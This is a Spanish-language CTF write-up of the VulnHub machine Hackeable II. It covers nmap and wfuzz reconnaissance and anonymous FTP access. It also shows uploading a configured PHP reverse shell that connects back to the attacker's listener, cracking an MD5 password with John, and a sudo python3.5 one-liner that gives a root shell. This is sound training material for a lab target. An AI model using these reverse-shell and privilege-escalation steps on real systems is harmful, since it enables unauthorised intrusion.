---
layout: single
title: <span class="vulnhub_azul">Hackeable II</span> - <span class="vulnhub_naranja">Vulnhub</span>
excerpt: "La máquina elegida para este write up será Hackeable_II, una máquina sencilla, pero entretenida. Esta refuerza puntos básicos del hacking, como el reconocimiento basico con nmap,
enumeración de directorios web, el uso de ftp vía Anonymous, establecimiento de una revershell entre el servidor y el atacante, crackeo de hashes con Jonh y escalada de privilegios por sudo."
date: 2022-06-24
classes: wide
header:
  teaser: /assets/images/Hackeable_II/Hackeable_II_descripcion.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.png
categories:
  - VulnHub
  - Hackeable_series
tags:  
  - WFUZZ
  - Reverse Shell
  - John
  - Privilege escalation
  - FTP Anonymous
---

## Descripción

La máquina elegida para este write up será Hackeable_II, una máquina sencilla, pero entretenida. Esta refuerza puntos básicos del hacking, como el reconocimiento basico con nmap, 
enumeración de directorios web, el uso de ftp vía Anonymous, establecimiento de una revershell entre el servidor y el atacante, crackeo de hashes con Jonh y escalada de privilegios por sudo.

## Indice

- [Escaneo de puertos](#escaneo-de-puertos)
- [Reconocimiento web](#reconocimiento-web)
- [WFUZZ](#wfuzz)
- [FTP](#ftp)
- [Reverse shell](#subimos-la-reverse-shell)
- [Reconocimiento dentro del host](#reconocimiento-dentro-del-host)
- [Identificación del hash](#tipo-de-hash)
- [Cracking del hash con Jonh](#cracking-del-hash-con-Jonh)
- [Escalada de Privilegios](#escalada-de-privilegios)
- [Conclusiones](#conclusiones)
- [Autores y Descarga](#autores-y-descarga)

## Escaneo de puertos

Comenzamos con el reconocimiento, para ello lanzaremos un nmap que nos detecte todos los puertos abiertos con --open -p- y con la mayor rapidez posible, 
lo exportaremos a un fichero en formato grepeable para mantener la información.

```
nmap --open -p- -T5 192.168.1.64 -oG puertos
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 16:23 CEST
Nmap scan report for 192.168.1.64
Host is up (0.00043s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.93 seconds

```

<br>Una vez hemos obtenido los puertos abiertos de la máquina víctima, podemos realizar un escaneo a esos puertos concretos utilizando algunos scripts predeterminados de NMAP:

```
-sCV -p 21,22,80 192.168.1.64 -Pn -oN Escaneo
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 16:45 CEST
Nmap scan report for 192.168.1.64
Host is up (0.00024s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2f:c6:2f:c4:6d:a6:f5:5b:c2:1b:f9:17:1f:9a:09:89 (RSA)
|   256 5e:91:1b:6b:f1:d8:81:de:8b:2c:f3:70:61:ea:6f:29 (ECDSA)
|_  256 f1:98:21:91:c8:ee:4d:a2:83:14:64:96:37:5b:44:3d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds

```

Como conclusiones podemos observar una posible vía de ataque por ftp en el puerto 21, ya que la autenticación por Anonymous está permitida, podemos ver que en el servidor ftp existe 
un archivo CALL.html más tarde esta información nos será útil. La máquina dispone de ssh por el puerto 22 y de un servidor web montado en el puerto 80.

## Reconocimiento web

Si nos dirigimos a la página podemos ver la plantilla por defecto de APACHE2.

![](/assets/images/Hackeable_II/APACHE2.png)

<br>Al encontrarnos en un CTF es habitual que se oculten pistas en el código fuente de la página web,
vamos a echar un vistazo.

![](/assets/images/Hackeable_II/dirb_pista.png)

Como podemos ver, la pista nos insinúa que utilicemos alguna herramienta de reconocimiento web, en mi caso utilizaré WFUZZ para realizar el ataque por fuerza bruta.

## WFUZZ

```
wfuzz -c --hc 404 -u http://192.168.1.64:80/FUZZ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.64:80/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                       
=====================================================================

000000001:   200        374 L    962 W      11239 Ch    "# directory-list-2.3-medium.txt"                                                                                                             
000000003:   200        374 L    962 W      11239 Ch    "# Copyright 2007 James Fisher"                                                                                                               
000000007:   200        374 L    962 W      11239 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                             
000000012:   200        374 L    962 W      11239 Ch    "# on at least 2 different hosts"                                                                                                             
000000004:   200        374 L    962 W      11239 Ch    "#"                                                                                                                                           
000000002:   200        374 L    962 W      11239 Ch    "#"                                                                                                                                           
000000005:   200        374 L    962 W      11239 Ch    "# This work is licensed under the Creative Commons"                                                                                          
000000008:   200        374 L    962 W      11239 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                                                                                  
000000006:   200        374 L    962 W      11239 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                               
000000011:   200        374 L    962 W      11239 Ch    "# Priority ordered case-sensitive list, where entries were found"                                                                            
000000013:   200        374 L    962 W      11239 Ch    "#"                                                                                                                                           
000000009:   200        374 L    962 W      11239 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                                                                         
000000014:   200        374 L    962 W      11239 Ch    "http://192.168.1.64:80/"                                                                                                                     
000000010:   200        374 L    962 W      11239 Ch    "#"                                                                                                                                           
000000094:   301        9 L      28 W       312 Ch      "files"                                                                                                                                       
000045240:   200        374 L    962 W      11239 Ch    "http://192.168.1.64:80/"                                                                                                                     
000095524:   403        9 L      28 W       277 Ch      "server-status"                                    
```
<br>Podemos ver un directorio llamado files, vamos a echarle un vistazo.

![](/assets/images/Hackeable_II/files.png)

<br>Vemos un archivo llamado CALL.html, anteriormente con nmap hemos visto que accediendo por ftp podemos acceder al directorio files donde se ubica CALL.html, interesante.

![](/assets/images/Hackeable_II/call.png)

¿Recibiremos una llamada? El título de la página es onion no es muy normal que digamos. Puede ser una forma de entretenernos y/o hacernos perder el tiempo. 
En este punto creo que es interesante investigar el contenido del servidor conectándonos a través de ftp.

## FTP

Vamos a conectarnos al ftp utilizando las credenciales anonymous/anonymous.

```
ftp 192.168.1.64
Connected to 192.168.1.64.
220 ProFTPD Server (ProFTPD Default Installation) [192.168.1.64]
Name (192.168.1.64:void4m0n): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||63601|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0             109 Nov 26  2020 CALL.html
226 Transfer complete
ftp> 

```
Como vemos ftp nos conecta con el directorio files, donde está ubicado CALL.html.

## Subimos la reverse shell

En este momento podemos intentar subir un archivo php el cual al ser llamado ejecute el código albergado estableciendo una reverse shell con la máquina atacante
podemos subir este archivo a través de ftp.

Consultamos la Cheat Sheet de <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank">Pentestmonkey</a>
y adaptamos la shell con los parametros deseados:

```
  47   │ set_time_limit (0);
  48   │ $VERSION = "1.0";
  49   │ $ip = '192.168.1.84';  // CHANGE THIS
  50   │ $port = 1234;       // CHANGE THIS
  51   │ $chunk_size = 1400;
  52   │ $write_a = null;
  53   │ $error_a = null;
  54   │ $shell = 'uname -a; w; id; /bin/sh -i';
  55   │ $daemon = 0;
  56   │ $debug = 0; 
```

<br>Subimos el archivo con la reverse shell al servidor:

```
ftp> put php-reverse-shell.php 
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||30588|)
150 Opening BINARY mode data connection for php-reverse-shell.php
100% |******************************************************************************************************************************************************************|  5494      174.64 MiB/s    00:00 ETA
226 Transfer complete
5494 bytes sent in 00:00 (13.78 MiB/s)
```
<br>El archivo con la revershell se ha subido con éxito al directorio `/files/`.

![](/assets/images/Hackeable_II/reverse_subida.png)

Antes de llamar al archivo para que se ejecute desde el navegador web nos pondremos por escucha por el puerto indicado en la reverse shell. 

Para ello utilizaremos netcat:

```
❯ nc -lvp 1234
listening on [any] 1234 ...

```

<br>Una vez llamemos al archivo php malicioso desde el navegador recibiremos la shell.

```
❯ nc -lvp 1234
listening on [any] 1234 ...
192.168.1.64: inverse host lookup failed: Unknown host
connect to [192.168.1.84] from (UNKNOWN) [192.168.1.64] 34428
Linux ubuntu 4.4.0-194-generic #226-Ubuntu SMP Wed Oct 21 10:19:36 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:55:42 up  5:04,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

## Reconocimiento dentro del host

Podemos intentar spawnear una TTY con: `python3 -c 'import pty; pty.spawn("/bin/sh")'`. Una vez tengamos una terminal decente para trabajar nos dirigimos a `/home/` y vemos el siguiente resultado.

```
$ cd home 
cd home
$ ls
ls
important.txt  shrek

```
Podemos deducir que existe un usuario shrek donde dentro de su directorio se encuentra la primera flag `user.txt`, pero no tenemos permisos de lectura. <br>
<br>También podemos observar un fichero llamado `important.txt` si hacemos un cat para ver su contenido encontramos lo siguiente:

```
cat important.txt
run the script to see the data

/.runme.sh

```

<br>Si ejecutamos el script obtenemos lo siguiente:

```
$ /.runme.sh
/.runme.sh
the secret key
is
trolled
restarting computer in 3 seconds...
restarting computer in 2 seconds...
restarting computer in 1 seconds...
⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆
⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆
⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆
⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠸⣼⡿
⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉
⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇
⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    shrek:cf4c2232354952690368f1b3dfdfb24d
```

Parece que hemos sido “troleados”, ¿no? Si nos fijamos podemos ver que se nos ha dado un posible hash correspondiente a la contraseña de shrek, vamos a ver que tipo de hash es usando hash-identifier.

## Tipo de hash

```
❯ hash-identifier cf4c2232354952690368f1b3dfdfb24d
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

```
## Cracking del hash con Jonh

Tenemos una coincidencia, MD5 parece ser el tipo correcto, teniendo el hash podemos intentar sacar la contraseña  sin estar haseada por medio de fuerza bruta, 
usando el diccionario ya conocido `rockyou.txt`. Para ello utilizaremos Jonh donde le pasamos el tipo de hash y un fichero donde esté guardado el mismo.

```
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash_shrek.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
onion            (?)     
1g 0:00:00:00 DONE (2022-06-24 21:38) 33.33g/s 2201Kp/s 2201Kc/s 2201KC/s panteraroz..jorie
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

```

Tenemos una coincidencia `onion` ¿Os suena de algo? Ya habíamos visto esta cadena de texto en el título html del archivo CALL.html, lo teníamos en nuestras narices desde el principio.
<br><br>Vamos a intentar conectarnos por ssh con `shrek:onion`.

```
❯ ssh shrek@192.168.1.64
shrek@192.168.1.64's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-194-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


90 packages can be updated.
68 updates are security updates.


Last login: Sun Jun 19 13:58:23 2022 from 192.168.1.84
shrek@ubuntu:~$ 
```

<br>
¡Bingo! Tenemos acceso al usuario por lo que onion es una credencial correcta, vamos a buscar la primera flag ubicada en el diretorio personal de shrek.<br><br>


```
user.txt
shrek@ubuntu:~$ cat user.txt 
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXK0OkkkkO0KXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXOo:'.            .';lkXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXKo'                        .ckXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXx,                 ........      :OXXXXXXXXXXXXXXXXXXXXX 
XXXXXXXXXXXXXXXXXXk.                  .............    'kXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXK;                    ...............    '0XXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXX0.          .:lol;.    .....;oxkxo:.....    oXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXX0         .oNMMMMMMMO.  ...lXMMMMMMMWO;...    cXXXXXXXXXXXXXXX
XXXXXXXXXXXXXK.        lWMMMMMMMMMMW; ..xMMMMMMMMMMMMx....   lXXXXXXXXXXXXXX
XXXXXXXXXXXXX;        kMMMMMMMMMMMMMM..:MMMMMMMMMMMMMM0...    OXXXXXXXXXXXXX
XXXXXXXXXXXXO        oMMMMMXKXMMMMMMM:.kMMMMMMNKNMMMMMMo...   'XXXXXXXXXXXXX
XXXXXXXXXXXX,        WMMWl. :OK0MMMMMl.OMMMMo. ,OXXWMMMX...    XXXXXXXXXXXXX
XXXXXXXXXXXX        'MMM:   0MMocMMMM,.oMMMl   xMMO;MMMM...    kXXXXXXXXXXXX
XXXXXXXXXXX0        .MMM,    .. ;MMM0 ..NMM:    .. 'MMMW...    kXXXXXXXXXXXX
XXXXXXXXXXXO         XMMX'     ,NMMX  ..;WMN,     .XMMMO...    xXXXXXXXXXXXX
XXXXXXXXXXX0         .NMMMXkxkXMMMk   ...,0MMXkxkXMMMMN,...    dXXXXXXXXXXXX
XXXXXXXXXXXX          .xWMMMMMMWk.    .....c0MMMMMMMMk'....    dXXXXXXXXXXXX
XXXXXXXXXXXXl            ,colc'   .;::o:dc,..'codxdc''.....    dXXXXXXXXXXXX
XXXXXXXXXXXXX         .OOkxxdxxkOOOx ,d.:OOOOkxxxxkkOOd....    xXXXXXXXXXXXX
XXXXXXXXXXXXXd         oOOOOOOOOOOOOxOOOOOOOOOOOOOOOOO,....    OXXXXXXXXXXXX
XXXXXXXXXXXXXX.         cOOOOOOOOOOOOOOOOOOOOOOOOOOOx,.....    KXXXXXXXXXXXX
XXXXXXXXXXXXXXO          .xOOOOOOOOOOOOOOOOOOOOOOOkc.......    NXXXXXXXXXXXX
XXXXXXXXXXXXXXX;           ;kOOOOOOOOOOOOOOOOOOOkc.........   ,XXXXXXXXXXXXX
XXXXXXXXXXXXXXX0             ;kOOOOOOOOOOOOOOOd;...........   dXXXXXXXXXXXXX
XXXXXXXXXXXXXXXX.              ,dOOOOOOOOOOdc'.............   xXXXXXXXXXXXXX
XXXXXXXXXXXXXXXX.                 .''''..   ...............   .kXXXXXXXXXXXX
XXXXXXXXXXXXXXXK           .;okKNWWWWNKOd:.    ..............   'kXXXXXXXXXX
XXXXXXXXXXXXXXX'        .dXMMMMMMMMMMMMMMMMWO:    .............   'kXXXXXXXX
XXXXXXXXXXXXXK'       ,0MMMMMMMMMMMMMMMMMMMMMMWx.   ............    ,KXXXXXX
XXXXXXXXXXXKc       .0MMMMMMMMMMMMMMMMMMMMMMMMMMMk.   ............    xXXXXX
XXXXXXXXXXl        cWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMo   .............   :XXXX
XXXXXXXXK.        dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0    ............   .KXX
XXXXXXXX.        'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO   .............   'XX

invite-me: https://www.linkedin.com/in/eliastouguinho/
```
Ya tenemos la primera flag, ahora a por la escalada de privilegios.

## Escalada de Privilegios

Para la escalada de privilegios vamos a probar con un típico sudo -l a ver que encontramos.

```
shrek@ubuntu:/home$ sudo -l
Matching Defaults entries for shrek on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shrek may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3.5

```
<br>Por lo que podemos ver el usuario shrek puede ejecutar como root gracias a sudo python3.5 por lo que podríamos escalar privilegios a través de python. Nos podemos ayudar de
<a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a>.<br><br>

```
$ whoami
shrek
$ sudo python3.5 -c 'import os; os.system("/bin/sh")'  
# whoami
root

```

<br>¡Ya hemos conseguido acceso root! Ahora a por esa flag ubicada en '/root/'.

```
# cat root.txt
                            ____
        ____....----''''````    |.
,'''````            ____....----; '.
| __....----''''````         .-.`'. '.
|.-.                .....    | |   '. '.
`| |        ..:::::::::::::::| |   .-;. |
 | |`'-;-::::::::::::::::::::| |,,.| |-='
 | |   | ::::::::::::::::::::| |   | |
 | |   | :::::::::::::::;;;;;| |   | |
 | |   | :::::::::;;;2KY2KY2Y| |   | |
 | |   | :::::;;Y2KY2KY2KY2KY| |   | |
 | |   | :::;Y2Y2KY2KY2KY2KY2| |   | |
 | |   | :;Y2KY2KY2KY2KY2K+++| |   | |
 | |   | |;2KY2KY2KY2++++++++| |   | |
 | |   | | ;++++++++++++++++;| |   | |
 | |   | |  ;++++++++++++++;.| |   | |
 | |   | |   :++++++++++++:  | |   | |
 | |   | |    .:++++++++;.   | |   | |
 | |   | |       .:;+:..     | |   | |
 | |   | |         ;;        | |   | |
 | |   | |      .,:+;:,.     | |   | |
 | |   | |    .::::;+::::,   | |   | |
 | |   | |   ::::::;;::::::. | |   | |
 | |   | |  :::::::+;:::::::.| |   | |
 | |   | | ::::::::;;::::::::| |   | |
 | |   | |:::::::::+:::::::::| |   | |
 | |   | |:::::::::+:::::::::| |   | |
 | |   | ::::::::;+++;:::::::| |   | |
 | |   | :::::::;+++++;::::::| |   | |
 | |   | ::::::;+++++++;:::::| |   | |
 | |   |.:::::;+++++++++;::::| |   | |
 | | ,`':::::;+++++++++++;:::| |'"-| |-..
 | |'   ::::;+++++++++++++;::| |   '-' ,|
 | |    ::::;++++++++++++++;:| |     .' |
,;-'_   `-._===++++++++++_.-'| |   .'  .'
|    ````'''----....___-'    '-' .'  .'
'---....____           ````'''--;  ,'
            ````''''----....____|.'

invite-me: https://www.linkedin.com/in/eliastouguinho/# 

```

## Conclusiones 


Ha sido una máquina bastante sencilla, pero muy útil para los que estamos empezando en este mundillo, como resumen se podría decir que hemos aprendido los siguientes conceptos:

- Reconocimiento con NMAP.
- Reconocimiento web a través de WFUZZ.
- Entablar reverse shell mediante un archivo php.
- Identificación y Crackeo de hashes utilizando hash-identifier y Jonh.
- Escalada de privilegios con sudo.

## Autores y Descarga
Autor del write up: Luis Miranda Sierra <a href="https://www.linkedin.com/in/luis-miranda-sierra-1358a4221/" target="_blank">Linkedin</a>.

El creador de la máquina es Elias Sousa <a href="https://www.linkedin.com/in/eliastouguinho/" target="_blank">Linkedin</a>, muchas gracias por la creación de esta máquina y su aporte a la comunidad.

La máquina Hackeable II se puede descargar en <a href="https://www.vulnhub.com/entry/hackable-ii,711/" target="_blank">VulnHub</a>.
